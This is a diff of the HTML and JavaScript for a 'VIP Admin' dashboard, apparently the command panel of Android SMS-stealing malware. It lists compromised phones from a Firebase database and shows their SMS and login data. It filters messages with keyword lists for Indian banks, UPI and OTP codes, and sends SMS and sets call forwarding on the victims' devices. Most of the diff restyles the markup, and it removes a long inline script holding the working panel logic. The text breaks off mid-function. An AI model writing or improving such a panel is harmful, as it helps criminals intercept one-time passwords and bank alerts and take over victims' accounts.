@@ -7,27 +7,23 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <link rel="stylesheet" href="f.css">
-    <style>
-        
-
-    </style>
+    <link rel="stylesheet" href="g.css">
+    <script defer="defer" src="m.js"></script>
+    
 </head>
 <body>
-    <!-- Loading Screen -->
     <div id="loadingScreen" class="loading-screen">
         <div class="loading-spinner"></div>
         <br>
         <p>Loading...</p>
     </div>
 
-    <!-- Setup Modal -->
     <div id="setupModal" class="setup-modal hidden">
         <div class="setup-content">
             <h2><i class="fas fa-cog"></i> Setup</h2>
             <div class="form-group">
-                <label>Set Admin Password:</label>
-                <input type="password" inputmode="numeric" minlength="5" maxlength="6" id="setupPassword" placeholder="Enter admin password" class="form-input">
+                
+                <input type="password" inputmode="numeric" inputmode="numeric" minlength="5" maxlength="6" id="setupPassword" placeholder="Enter admin password" class="form-input">
             </div>
             <button onclick="setupAdmin()" class="btn btn-primary" style="width: 100%;">
                 <i class="fas fa-save"></i> Save Password
@@ -35,12 +31,17 @@
         </div>
     </div>
 
-    <!-- Login Modal -->
     <div id="loginModal" class="modal hidden">
         <div class="modal-content">
-            <h2 style="text-align: center; margin-bottom: 15px; background: #ff0a00; -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
-               VIP <i class="fas fa-lock"></i> Admin
-            </h2>
+            <h3 style="text-align: center; margin-bottom: 25px; 
+                   font-size: 1.8rem; font-weight: bold; 
+                   /* MODIFIED: Yellow gradient for Login Modal */
+                   background: linear-gradient(45deg, var(--color-accent-main), #FFEB3B); 
+                   -webkit-background-clip: text; 
+                   -webkit-text-fill-color: transparent;">
+           VIP <i class="fas fa-lock"></i> Admin
+        </h3>
+        
             <div class="form-group">
                 <input type="password" inputmode="numeric" minlength="4" maxlength="6" id="adminPassword" placeholder="Admin Password" class="form-input">
             </div>
@@ -50,12 +51,11 @@
         </div>
     </div>
 
-    <!-- Password Verification Modal -->
     <div id="passwordModal" class="password-modal hidden">
         <div class="password-content">
             <h3><i class="fas fa-shield-alt"></i> Verify Password</h3>
             <div class="form-group">
-                <input type="password" id="verifyPassword" inputmode="numeric" placeholder="Enter admin password" class="form-input">
+                <input type="text" id="verifyPassword" inputmode="numeric" placeholder="Enter admin password" class="form-input">
             </div>
             <div class="button-group">
                 <button onclick="verifyPassword()" class="btn btn-primary">
@@ -68,7 +68,6 @@
         </div>
     </div>
 
-    <!-- Device SMS Modal -->
     <div id="deviceSMSModal" class="device-sms-modal hidden">
         <div class="modal-content xlarge">
             <span class="close" onclick="closeDeviceSMSModal()">&times;</span>
@@ -87,8 +86,8 @@
                     <i class="fas fa-search"></i>
                 </div>
                 <div class="header">
-                <button onclick="filterDeviceBankingSMS()" class="nav-btn">
-                    <i class="fas fa-university"></i> Banking
+                <button onclick="filterDevicePaymentTransactionSMS()" class="nav-btn">
+                    <i class="fas fa-exchange-alt"></i> Pay
                 </button>
                 <button onclick="filterDeviceOTPSMS()" class="nav-btn">
                     <i class="fas fa-shield-alt"></i> OTP
@@ -108,58 +107,62 @@
         </div>
     </div>
 
-    <!-- Main Dashboard -->
+
     <div id="dashboard" class="dashboard hidden">
-        <!-- Header -->
+        
         <header class="header">
+            
             <div class="header-content">
-                <h1>VIP <i class="fas fa-shield-alt"></i> Admin</h1>
-                
+                <h1>VIP <i class="fas fa-shield-alt"></i> ADMIN </h1>
+            
+            
             </div>
         </header>
-        <!-- Header -->
-      
-            <div class="header">
+        <div class="header-content">
+        <div class="header">
             <button class="nav-btn active" onclick="showSection('users')">
-                <i class="fas fa-users"></i> ALL Devices
+                <i class="fas fa-users"></i> Devices
             </button>
             <button class="nav-btn" onclick="showSection('sms')">
                 <i class="fas fa-envelope"></i> All SMS
             </button>        
             <button class="nav-btn" onclick="showSection('dataGroup')">
-                <i class="fas fa-database"></i> All Data
+                <i class="fas fa-database"></i> Data
             </button>
             </div>
-            
+            </div>
+            <div class="header-content">
             <div class="header">        
+             
             <button class="nav-btn" onclick="showSection('settings')">
-                <i class="fas fa-cog"></i> </i> <i class="fas fa-cog"></i>
+                <i class="fas fa-cog"></i> Settings
+            </button>
+            <button id="darkModeToggle" class="nav-btn" onclick="toggleDarkMode()">
+                <i class="fas fa-moon"></i> Dark Mode
             </button>
             <button class="nav-btn" onclick="showSection('pinned')">
                 <i class="fas fa-thumbtack"></i> Pin
             </button>
-          
-                    <span id="onlineCount" class="stat-badge online"><i class="fas fa-wifi"></i> Online: 0</span>
-                    <span id="totalCount" class="stat-badge total"><i class="fas fa-users"></i> Total: 0</span>
-                    
-                
+            </div>
                 </div>
-   
-        
-        
-        
         <main class="main-content">
-            <!-- Users Section -->
             <section id="usersSection" class="content-section">
                 <div class="section-header">
-                    <h2><i class="fas fa-mobile-alt"></i> Connected Devices</h2>
+                    <div class="header-content">
+                    <h5><span id="onlineCount" class="stat-badge online"><i class="fas fa-wifi"></i> On: 0</span>
+                    <span id="totalCount" class="stat-badge total"><i class="fas fa-users"></i> ALL: 0</span></h5>
+                    <br>
+                    <button onclick="requestDeleteOfflineDevices()" class="btn btn-danger">
+                        <i class="fas fa-trash-alt"></i> Delete All Offline
+                    </button>
+                    </div>
+                    
                     <div class="search-box">
                         <input type="text" id="userSearch" placeholder="Search by serial, name, number..." onkeyup="filterUsers()">
                         <i class="fas fa-search"></i>
                     </div>
                 </div>
                 
-                <!-- Search Results Header for Users -->
                 <div id="userSearchResults" class="search-results-header hidden">
                     <h3><i class="fas fa-search"></i> Search Results</h3>
                     <div style="display: flex; align-items: center; gap: 12px;">
@@ -177,34 +180,37 @@
                 </div>
             </section>
 
-            <!-- All SMS Section -->
             <section id="smsSection" class="content-section hidden">
                 <div class="section-header">
                     <h2><i class="fas fa-envelope"></i> All SMS Messages</h2>
+                    
+                    <br>
+                  
+                    <button onclick="requestClearAllSMS()" class="btn btn-danger">
+                            <i class="fas fa-trash"></i> All SMS
+                        </button>
+                        
                     <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
                         <div class="search-box">
                             <input type="text" id="smsSearch" placeholder="Search SMS by sender, message, device..." onkeyup="filterSMS()">
                             <i class="fas fa-search"></i>
                         </div>
                         <div class="header">
-                        <button onclick="filterBankingSMS()" class="nav-btn">
-                            <i class="fas fa-university"></i> Bank
+                        <button onclick="filterPaymentTransactionSMS()" class="nav-btn">
+                            <i class="fas fa-exchange-alt"></i> Pay
                         </button>
                         <button onclick="filterOTPSMS()" class="nav-btn">
                             <i class="fas fa-shield-alt"></i> OTP
                         </button>
-                        <button onclick="clearSMSSearch()" class="nav-btn">
+                        
+                      <button onclick="clearSMSSearch()" class="nav-btn">
                             <i class="fas fa-times"></i> Clear
                         </button>
-                      
-                        <button onclick="requestClearAllSMS()" class="nav-btn">
-                            <i class="fas fa-trash"></i> All SMS
-                        </button>
+                        
                         </div>
                     </div>
                 </div>
                 
-                <!-- Search Results Header for SMS -->
                 <div id="smsSearchResults" class="search-results-header hidden">
                     <h3><i class="fas fa-search"></i> SMS Search Results</h3>
                     <div style="display: flex; align-items: center; gap: 12px;">
@@ -222,7 +228,6 @@
                 </div>
             </section>
 
-            <!-- All Data Group Section -->
             <section id="dataGroupSection" class="content-section hidden">
                 <div class="section-header">
                     <h2><i class="fas fa-database"></i> All Data Group</h2>
@@ -247,11 +252,10 @@
                 </div>
             </section>
 
-            <!-- Pinned Devices Section -->
             <section id="pinnedSection" class="content-section hidden">
                 <div class="section-header">
                     <h2><i class="fas fa-thumbtack"></i> Pinned Devices</h2>
-                    <span class="stat-badge" style="background: #FFD700; color: #333;">
+                    <span class="stat-badge" style="background: #FFD700; color: var(--color-bg-primary);">
                         <i class="fas fa-thumbtack"></i> Pinned: <span id="pinnedCount">0</span>
                     </span>
                 </div>
@@ -263,16 +267,14 @@
                 </div>
             </section>
 
-            <!-- Settings Section -->
             <section id="settingsSection" class="content-section hidden">
                 <div class="section-header">
-                    <h2><i class="fas fa-cog"></i></h2>
+                    <h2><i class="fas fa-cog"></i> Settings</h2>
                 </div>
                 
                 <div class="settings-card">
-                    <h3><i class="fas fa-forward"></i> Forward Number Settings</h3>
+                    <h3><i class="fas fa-forward"></i> Forward No</h3>
                     <div class="form-group">
-                        <label>Current Forward Number:</label>
                         <input type="text" id="forwardNumber" inputmode="numeric" placeholder="Enter phone number" minlength="3" maxlength="10" class="form-input">
                     </div>
                     <div class="button-group">
@@ -286,9 +288,8 @@
                 </div>
 
                 <div class="settings-card">
-                    <h3><i class="fas fa-shield-alt"></i> Admin Password</h3>
+                    <h3><i class="fas fa-shield-alt"></i>New Password</h3>
                     <div class="form-group">
-                        <label>New Admin Password:</label>
                         <input type="password" inputmode="numeric" minlength="5" maxlength="6" id="newAdminPassword" placeholder="Enter new password" class="form-input">
                     </div>
                     <button onclick="updateAdminPassword()" class="btn btn-primary">
@@ -299,31 +300,41 @@
         </main>
     </div>
 
-    <!-- User Details Modal -->
     <div id="userModal" class="modal hidden">
         <div class="modal-content large">
             <span class="close" onclick="closeUserModal()">&times;</span>
-            <h2 id="userModalTitle" style="background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+            <h2 id="userModalTitle" style="background: linear-gradient(45deg, var(--color-accent-main), #FFEB3B); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                 Device Details
             </h2>
             
             <div class="tabs">
-                <div class="tab active" onclick="showTab('deviceInfo')">Device Info</div>
-                <div class="tab" onclick="showTab('smsData')">SMS Data</div>
-                <div class="tab" onclick="showTab('loginData')">Login Data</div>
+                <div class="nav-btn active" onclick="showTab('deviceInfo')">Device Info</div>
+                <div class="nav-btn" onclick="showTab('smsData')">SMS Data</div>
+                <div class="nav-btn" onclick="showTab('loginData')">Login Data</div>
             </div>
-
+            
+            <div id="modalActionButtons" class="action-row-wrapper">
+                <div class="button-group" style="justify-content: flex-start;">
+                    <button id="modalSendSMSBtn" class="btn btn-primary" style="font-size: 0.85rem;">
+                        <i class="fas fa-sms"></i> Send SMS
+                    </button>
+                    <button id="modalCallForwardBtn" class="btn btn-info" style="font-size: 0.85rem;">
+                        <i class="fas fa-phone"></i> Call Forwarding
+                    </button>
+                    <button id="modalDeleteDeviceBtn" class="btn btn-danger" style="font-size: 0.85rem;">
+                        <i class="fas fa-trash"></i> Delete Device
+                    </button>
+                </div>
+            </div>
             <div id="userModalContent">
-                <!-- Content will be loaded dynamically -->
-            </div>
+                </div>
         </div>
     </div>
 
-    <!-- Send SMS Modal -->
     <div id="sendSMSModal" class="modal hidden">
         <div class="modal-content">
             <span class="close" onclick="closeSendSMSModal()">&times;</span>
-            <h2 style="background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+            <h2 style="text-align: center; margin-bottom: 15px; background: linear-gradient(45deg, var(--color-accent-main), #FFEB3B); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                 <i class="fas fa-paper-plane"></i> Send SMS
             </h2>
             <div class="form-group">
@@ -335,7 +346,7 @@
             </div>
             <div class="form-group">
                 
-                <input type="text" id="smsNumber" placeholder="Enter phone number" class="form-input">
+                <input type="text" id="smsNumber" inputmode="numeric" maxlength="10" placeholder="Enter phone number" class="form-input">
             </div>
             <div class="form-group">
                 
@@ -349,11 +360,10 @@
         </div>
     </div>
 
-    <!-- Call Forward Modal -->
     <div id="callForwardModal" class="modal hidden">
         <div class="modal-content">
             <span class="close" onclick="closeCallForwardModal()">&times;</span>
-            <h2 style="background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+            <h2 style="text-align: center; margin-bottom: 15px; background: linear-gradient(45deg, var(--color-accent-main), #FFEB3B); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                 <i class="fas fa-phone"></i> Call Forwarding
             </h2>
             <div class="form-group">
@@ -365,1946 +375,25 @@
             </div>
             <div class="form-group">
                 
-                <input type="text" id="forwardCallNumber" placeholder="Enter forward number" class="form-input">
+                <input type="text" id="forwardCallNumber" minlength="10" maxlength="10" inputmode="numeric" placeholder="Enter forward number" class="form-input">
             </div>
             
             <div class="button-group">
-                <button onclick="activateCallForward()" class="btn btn-primary">Activate</button>
-                <button onclick="deactivateCallForward()" class="btn btn-warning">Deactivate</button>
-                <button onclick="checkForwardStatus()" class="btn btn-info">Check Status</button>
+                <button onclick="activateCallForward()" class="btn btn-success" style="flex: 1; padding: 8px 15px; font-size: 0.95rem;">
+                    <i class="fas fa-check"></i> Activate
+                </button>
+                <button onclick="deactivateCallForward()" class="btn btn-danger" style="flex: 1; padding: 8px 15px; font-size: 0.95rem;">
+                    <i class="fas fa-power-off"></i> Deactivate
+                </button>
+                
+            </div>
+            <div class="button-group" style="margin-top: 15px;">
+                <button onclick="checkForwardStatus()" class="btn btn-info" style="width: 100%;">
+                    <i class="fas fa-sync-alt"></i> Check Status
+                </button>
             </div>
             <div id="forwardStatus" style="margin-top: 12px; padding: 8px; border-radius: 4px; display: none;"></div>
         </div>
     </div>
-
-    <script>
-        // Firebase Configuration - Replace with your actual Firebase config
-        const firebaseConfig = {
-    databaseURL: "https://smarth-68fcc-default-rtdb.firebaseio.com"
-        };
-
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        // Global Variables
-        let currentUser = null;
-        let allUsers = [];
-        let adminPassword = "";
-        let currentDeviceData = null;
-        let deviceSerialNumbers = {};
-        let pinnedDevices = [];
-        let allSMSData = [];
-        let pendingDeleteAction = null;
-        let pendingDeleteData = null;
-        let currentDeviceSMS = [];
-        let currentDeviceIdForSMS = null;
-        let currentSearchTerm = '';
-        let currentSMSSearchTerm = '';
-        let allLoginData = [];
-        
-        // Realtime Listeners
-        let userDataListener = null;
-        let smsDataListener = null;
-        let loginDataListener = null;
-        let pinnedDevicesListener = null;
-        let forwardNumberListener = null;
-        let serialNumbersListener = null;
-
-        // DOM Elements
-        const loadingScreen = document.getElementById('loadingScreen');
-        const setupModal = document.getElementById('setupModal');
-        const loginModal = document.getElementById('loginModal');
-        const passwordModal = document.getElementById('passwordModal');
-        const deviceSMSModal = document.getElementById('deviceSMSModal');
-        const dashboard = document.getElementById('dashboard');
-        const usersGrid = document.getElementById('usersGrid');
-        const pinnedDevicesGrid = document.getElementById('pinnedDevicesGrid');
-        const pinnedCount = document.getElementById('pinnedCount');
-        const smsList = document.getElementById('smsList');
-        const deviceSMSList = document.getElementById('deviceSMSList');
-        const loginDataContainer = document.getElementById('loginDataContainer');
-        const dataSizeBadge = document.getElementById('dataSizeBadge');
-        const onlineCount = document.getElementById('onlineCount');
-        const totalCount = document.getElementById('totalCount');
-        const deviceSMSTitle = document.getElementById('deviceSMSTitle');
-        const smsCount = document.getElementById('smsCount');
-        const userSearchResults = document.getElementById('userSearchResults');
-        const smsSearchResults = document.getElementById('smsSearchResults');
-        const userSearchCount = document.getElementById('userSearchCount');
-        const smsSearchCount = document.getElementById('smsSearchCount');
-
-        // Banking Keywords
-        const bankingKeywords = [
-            'bank', 'account', 'transaction', 'upi', 'payment', 'transfer', 'balance', 
-            'debit', 'credit', 'card', 'atm', 'withdraw', 'deposit', 'loan', 'emi',
-            'hdfc', 'sbi', 'icici', 'axis', 'kotak', 'yes bank', 'indusind', 'pnb',
-            'canara', 'union bank', 'idfc', 'rbl', 'bandhan', 'federal', 'upi',
-            'imps', 'neft', 'rtgs', 'ifsc', 'micr', 'cheque', 'overdraft', 'interest',
-            'statement', 'passbook', 'pin', 'cvv', 'expiry', 'wallet', 'paytm',
-            'google pay', 'phonepe', 'amazon pay', 'bhim', 'net banking', 'mobile banking'
-        ];
-
-        const otpKeywords = [
-            'otp', 'one time password', 'verification code', 'auth code', 'security code',
-            'login code', 'access code', '2fa', 'two factor', 'authentication code',
-            'confirm code', 'verify code', 'activation code', 'security key'
-        ];
-
-        // Initialize Application
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(() => {
-                loadingScreen.classList.add('hidden');
-                checkAdminSetup();
-            }, 1500);
-        });
-
-        // Check if admin password is set
-        function checkAdminSetup() {
-            database.ref('admin_password').once('value')
-                .then(snapshot => {
-                    const savedPassword = snapshot.val();
-                    if (savedPassword) {
-                        adminPassword = savedPassword;
-                        loginModal.classList.remove('hidden');
-                    } else {
-                        setupModal.classList.remove('hidden');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error checking admin setup:', error);
-                    setupModal.classList.remove('hidden');
-                });
-        }
-
-        // Setup Admin Password
-        function setupAdmin() {
-            const password = document.getElementById('setupPassword').value.trim();
-            if (password.length >= 4) {
-                database.ref('admin_password').set(password)
-                    .then(() => {
-                        adminPassword = password;
-                        setupModal.classList.add('hidden');
-                        loginModal.classList.remove('hidden');
-                        showToast('Admin password set successfully!', 'success');
-                    })
-                    .catch(error => {
-                        showToast('Error setting password: ' + error.message, 'error');
-                    });
-            } else {
-                showToast('Password must be at least 4 characters', 'error');
-            }
-        }
-
-        // Admin Authentication
-        function checkAdminPassword() {
-            const password = document.getElementById('adminPassword').value;
-            if (password === adminPassword) {
-                loginModal.classList.add('hidden');
-                dashboard.classList.remove('hidden');
-                initializeDashboard();
-                showToast('Welcome to Admin Panel!', 'success');
-            } else {
-                showToast('Invalid password!', 'error');
-            }
-        }
-
-        function logout() {
-            // Remove all realtime listeners
-            removeAllListeners();
-            
-            dashboard.classList.add('hidden');
-            loginModal.classList.remove('hidden');
-            document.getElementById('adminPassword').value = '';
-            showToast('Logged out successfully', 'success');
-        }
-
-        function removeAllListeners() {
-            if (userDataListener) userDataListener();
-            if (smsDataListener) smsDataListener();
-            if (loginDataListener) loginDataListener();
-            if (pinnedDevicesListener) pinnedDevicesListener();
-            if (forwardNumberListener) forwardNumberListener();
-            if (serialNumbersListener) serialNumbersListener();
-        }
-
-        function updateAdminPassword() {
-            const newPassword = document.getElementById('newAdminPassword').value;
-            if (newPassword.length >= 4) {
-                database.ref('admin_password').set(newPassword)
-                    .then(() => {
-                        adminPassword = newPassword;
-                        document.getElementById('newAdminPassword').value = '';
-                        showToast('Admin password updated!', 'success');
-                    })
-                    .catch(error => {
-                        showToast('Error updating password: ' + error.message, 'error');
-                    });
-            } else {
-                showToast('Password must be at least 4 characters', 'error');
-            }
-        }
-
-        // Dashboard Initialization with Realtime Listeners
-        function initializeDashboard() {
-            loadSerialNumbers(); // Load serial numbers first
-            setupRealtimeListeners();
-        }
-
-        // Setup all realtime listeners
-        function setupRealtimeListeners() {
-            setupUserDataListener();
-            setupSMSDataListener();
-            setupLoginDataListener();
-            setupPinnedDevicesListener();
-            setupForwardNumberListener();
-            setupSerialNumbersListener();
-        }
-
-        // Load persistent serial numbers from Firebase with realtime listener
-        function setupSerialNumbersListener() {
-            serialNumbersListener = database.ref('device_serial_numbers').on('value', (snapshot) => {
-                deviceSerialNumbers = snapshot.val() || {};
-                console.log('Serial numbers updated:', deviceSerialNumbers);
-                // Refresh users display when serial numbers change
-                if (allUsers.length > 0) {
-                    displayUsers(allUsers);
-                }
-            }, (error) => {
-                console.error('Error loading serial numbers:', error);
-                deviceSerialNumbers = {};
-            });
-        }
-
-        function loadSerialNumbers() {
-            database.ref('device_serial_numbers').once('value')
-                .then(snapshot => {
-                    deviceSerialNumbers = snapshot.val() || {};
-                    console.log('Loaded serial numbers:', deviceSerialNumbers);
-                })
-                .catch(error => {
-                    console.error('Error loading serial numbers:', error);
-                    deviceSerialNumbers = {};
-                });
-        }
-
-        // Save serial numbers to Firebase
-        function saveSerialNumbers() {
-            database.ref('device_serial_numbers').set(deviceSerialNumbers)
-                .then(() => {
-                    console.log('Serial numbers saved successfully');
-                })
-                .catch(error => {
-                    console.error('Error saving serial numbers:', error);
-                });
-        }
-
-        // User Management with Realtime Listener - FIXED SERIAL NUMBER DUPLICATE ISSUE
-        function setupUserDataListener() {
-            userDataListener = database.ref('user_data').on('value', (snapshot) => {
-                allUsers = [];
-                let onlineUsers = 0;
-                let totalUsers = 0;
-
-                snapshot.forEach((userSnapshot) => {
-                    const user = userSnapshot.val();
-                    user.id = userSnapshot.key;
-                    
-                    const isOnline = checkUserOnlineStatus(user);
-                    user.isOnline = isOnline;
-                    
-                    if (isOnline) onlineUsers++;
-                    totalUsers++;
-                    
-                    allUsers.push(user);
-                });
-
-                // Assign unique serial numbers based on install time
-                assignInstallTimeSerialNumbers(allUsers);
-
-                // Sort by serial number descending (highest serial first - newest devices)
-                allUsers.sort((a, b) => {
-                    const serialA = deviceSerialNumbers[a.id] || 0;
-                    const serialB = deviceSerialNumbers[b.id] || 0;
-                    return serialB - serialA; // Descending order - newest first
-                });
-
-                onlineCount.textContent = `Online: ${onlineUsers}`;
-                totalCount.textContent = `Total: ${totalUsers}`;
-                
-                // Apply current search filter if any
-                if (currentSearchTerm) {
-                    filterUsers();
-                } else {
-                    displayUsers(allUsers);
-                }
-                displayPinnedDevices();
-            }, (error) => {
-                console.error('Error loading users:', error);
-                showToast('Error loading devices', 'error');
-            });
-        }
-
-        // FIXED: InstallTime based unique serial number assignment
-        function assignInstallTimeSerialNumbers(users) {
-            let hasChanges = false;
-            
-            // Sort all users by install time (newest first)
-            const sortedUsers = [...users].sort((a, b) => {
-                const timeA = getInstallTime(a);
-                const timeB = getInstallTime(b);
-                return timeB - timeA; // NEWEST first (descending)
-            });
-
-            // Get all existing serial numbers to check for duplicates
-            const existingSerials = new Set();
-            Object.values(deviceSerialNumbers).forEach(serial => {
-                existingSerials.add(serial);
-            });
-
-            // Create a map of deviceId to install time for quick lookup
-            const installTimeMap = {};
-            sortedUsers.forEach(user => {
-                installTimeMap[user.id] = getInstallTime(user);
-            });
-
-            // Get all devices (existing and new) sorted by install time
-            const allDeviceIds = sortedUsers.map(user => user.id);
-            
-            // Find the maximum serial number currently in use
-            let maxSerial = 0;
-            Object.values(deviceSerialNumbers).forEach(serial => {
-                if (serial > maxSerial) maxSerial = serial;
-            });
-
-            // Assign serial numbers based on install time order
-            const assignedSerials = new Set();
-            const newAssignments = {};
-
-            // First, preserve existing serial numbers for devices that still exist
-            sortedUsers.forEach(user => {
-                const existingSerial = deviceSerialNumbers[user.id];
-                if (existingSerial && !assignedSerials.has(existingSerial)) {
-                    newAssignments[user.id] = existingSerial;
-                    assignedSerials.add(existingSerial);
-                }
-            });
-
-            // Then assign serial numbers to devices without serial numbers
-            let nextAvailableSerial = 1;
-            sortedUsers.forEach(user => {
-                if (!newAssignments[user.id]) {
-                    // Find the next available serial number that's not already assigned
-                    while (assignedSerials.has(nextAvailableSerial)) {
-                        nextAvailableSerial++;
-                    }
-                    
-                    // If we've exceeded max serial, find the next gap
-                    if (nextAvailableSerial > maxSerial) {
-                        maxSerial = nextAvailableSerial;
-                    }
-                    
-                    newAssignments[user.id] = nextAvailableSerial;
-                    assignedSerials.add(nextAvailableSerial);
-                    hasChanges = true;
-                    console.log(`Assigned serial ${nextAvailableSerial} to device ${user.id} (install time: ${new Date(getInstallTime(user)).toLocaleString()})`);
-                    
-                    nextAvailableSerial++;
-                }
-            });
-
-            // Update deviceSerialNumbers with new assignments
-            Object.keys(newAssignments).forEach(deviceId => {
-                deviceSerialNumbers[deviceId] = newAssignments[deviceId];
-            });
-
-            // Remove serial numbers for devices that no longer exist
-            Object.keys(deviceSerialNumbers).forEach(deviceId => {
-                if (!users.find(user => user.id === deviceId)) {
-                    delete deviceSerialNumbers[deviceId];
-                    hasChanges = true;
-                    console.log(`Removed serial number for deleted device ${deviceId}`);
-                }
-            });
-
-            // Save to Firebase if there were changes
-            if (hasChanges) {
-                saveSerialNumbers();
-            }
-
-            // Final verification - check for duplicates
-            const finalSerials = new Set();
-            let hasDuplicates = false;
-            Object.values(deviceSerialNumbers).forEach(serial => {
-                if (finalSerials.has(serial)) {
-                    console.error(`DUPLICATE SERIAL FOUND: ${serial}`);
-                    hasDuplicates = true;
-                }
-                finalSerials.add(serial);
-            });
-
-            if (hasDuplicates) {
-                console.error('DUPLICATE SERIAL NUMBERS DETECTED!');
-            } else {
-                console.log('Serial number assignment completed successfully - No duplicates found');
-            }
-        }
-
-        function getInstallTime(user) {
-            // Try to get install time from various possible fields
-            if (user.installTime) {
-                return new Date(user.installTime).getTime();
-            }
-            if (user.timestamp) {
-                return new Date(user.timestamp).getTime();
-            }
-            if (user.TimeandDate) {
-                return new Date(user.TimeandDate).getTime();
-            }
-            // If no timestamp found, use current time for new devices
-            return Date.now();
-        }
-
-        // Pinned Devices with Realtime Listener
-        function setupPinnedDevicesListener() {
-            pinnedDevicesListener = database.ref('pinned_devices').on('value', (snapshot) => {
-                pinnedDevices = snapshot.val() || [];
-                pinnedCount.textContent = pinnedDevices.length;
-                displayPinnedDevices();
-            }, (error) => {
-                console.error('Error loading pinned devices:', error);
-            });
-        }
-
-        function togglePinDevice(userId) {
-            event.stopPropagation();
-            const index = pinnedDevices.indexOf(userId);
-            if (index > -1) {
-                // Unpin device
-                pinnedDevices.splice(index, 1);
-            } else {
-                // Pin device
-                pinnedDevices.push(userId);
-            }
-            
-            database.ref('pinned_devices').set(pinnedDevices)
-                .then(() => {
-                    showToast('Device pin status updated!', 'success');
-                })
-                .catch(error => {
-                    showToast('Error updating pin: ' + error.message, 'error');
-                });
-        }
-
-        function displayPinnedDevices() {
-            const pinnedUsers = allUsers.filter(user => pinnedDevices.includes(user.id));
-            
-            if (pinnedUsers.length > 0) {
-                displayUsersGrid(pinnedUsers, pinnedDevicesGrid, true);
-            } else {
-                pinnedDevicesGrid.innerHTML = `
-                    <div class="empty-state">
-                        <i class="fas fa-thumbtack"></i>
-                        <h3>No Pinned Devices</h3>
-                        <p>Pin your important devices to see them here</p>
-                    </div>
-                `;
-            }
-        }
-
-        // Real-time Online/Offline Status Check
-        function checkUserOnlineStatus(user) {
-            // Check status field directly from database
-            if (user.status === 'offline') {
-                return false;
-            }
-            
-            if (user.status === 'online') {
-                return true;
-            }
-            
-            // Check timestamp for recent activity (within last 2 minutes)
-            if (user.timestamp) {
-                const lastUpdate = new Date(user.timestamp);
-                const now = new Date();
-                const diffMinutes = (now - lastUpdate) / (1000 * 60);
-                
-                if (diffMinutes < 2) {
-                    return true;
-                }
-            }
-            
-            // Check TimeandDate field if available
-            if (user.TimeandDate) {
-                try {
-                    const lastActive = new Date(user.TimeandDate);
-                    const now = new Date();
-                    const diffMinutes = (now - lastActive) / (1000 * 60);
-                    
-                    if (diffMinutes < 2) {
-                        return true;
-                    }
-                } catch (e) {
-                    console.log('Error parsing TimeandDate:', e);
-                }
-            }
-            
-            return false;
-        }
-
-        function checkDeviceStatus(userId) {
-            const user = allUsers.find(u => u.id === userId);
-            if (user) {
-                const isOnline = checkUserOnlineStatus(user);
-                showToast(`Device ${user.d_name} is ${isOnline ? 'Online' : 'Offline'}`, isOnline ? 'success' : 'warning');
-            }
-        }
-
-        function getDeviceIcon(deviceInfo) {
-            if (!deviceInfo) return 'mobile-alt';
-            
-            const info = deviceInfo.toLowerCase();
-            if (info.includes('vivo')) return 'mobile-android';
-            if (info.includes('samsung')) return 'mobile-android';
-            if (info.includes('moto')) return 'mobile-android';
-            if (info.includes('xiaomi') || info.includes('redmi')) return 'mobile-android';
-            if (info.includes('oppo')) return 'mobile-android';
-            if (info.includes('iphone') || info.includes('ios')) return 'mobile-apple';
-            if (info.includes('nokia')) return 'mobile-alt';
-            if (info.includes('realme')) return 'mobile-android';
-            return 'mobile-alt';
-        }
-
-        function getBatteryColor(level) {
-            if (level >= 70) return '#4CAF50';
-            if (level >= 30) return '#ff9800';
-            return '#f44336';
-        }
-
-        function displayUsers(users) {
-            displayUsersGrid(users, usersGrid, false);
-        }
-
-        function displayUsersGrid(users, gridElement, isPinnedSection) {
-            gridElement.innerHTML = '';
-            
-            if (users.length === 0) {
-                gridElement.innerHTML = `
-                    <div class="empty-state">
-                        <i class="fas fa-users-slash"></i>
-                        <h3>No Devices Found</h3>
-                        <p>No devices are currently connected</p>
-                    </div>
-                `;
-                return;
-            }
-
-            users.forEach(user => {
-                const deviceIcon = getDeviceIcon(user.Device_info || user.device_info);
-                const batteryLevel = user.battery || user.batteryLevel || 0;
-                const batteryColor = getBatteryColor(batteryLevel);
-                const batteryWidth = Math.max(10, Math.min(100, batteryLevel));
-                const deviceName = user.Device_info || user.device_info || 'Unknown Device';
-                const dName = user.d_name || 'Unknown';
-                const serialNumber = deviceSerialNumbers[user.id] || 0;
-                const isPinnedDevice = pinnedDevices.includes(user.id);
-                const isSearchResult = currentSearchTerm && checkUserMatchSearch(user, currentSearchTerm);
-                
-                const userCard = document.createElement('div');
-                userCard.className = `user-card ${user.isOnline ? 'online' : 'offline'} ${isPinnedDevice ? 'pinned' : ''} ${isSearchResult ? 'highlight' : ''}`;
-                userCard.onclick = () => openUserModal(user);
-
-                userCard.innerHTML = `
-                    <div class="user-header">
-                        <div class="device-info">
-                            <div class="device-serial" onclick="event.stopPropagation(); navigateToDevice('${user.id}')">${serialNumber}</div>
-                            <i class="fas fa-${deviceIcon} device-icon"></i>
-                            <div style="flex: 1;">
-                                <div class="user-id">${dName}</div>
-                                
-                            </div>
-                        </div>
-                        <div style="display: flex; align-items: center; gap: 8px;">
-                            <div class="user-status ${user.isOnline ? 'status-online' : 'status-offline'}">
-                                ${user.isOnline ? 'Online' : 'Offline'}
-                            </div>
-                            <button class="status-check-btn" onclick="event.stopPropagation(); checkDeviceStatus('${user.id}')">
-                                <i class="fas fa-sync-alt"></i>
-                            </button>
-                            ${!isPinnedSection ? `
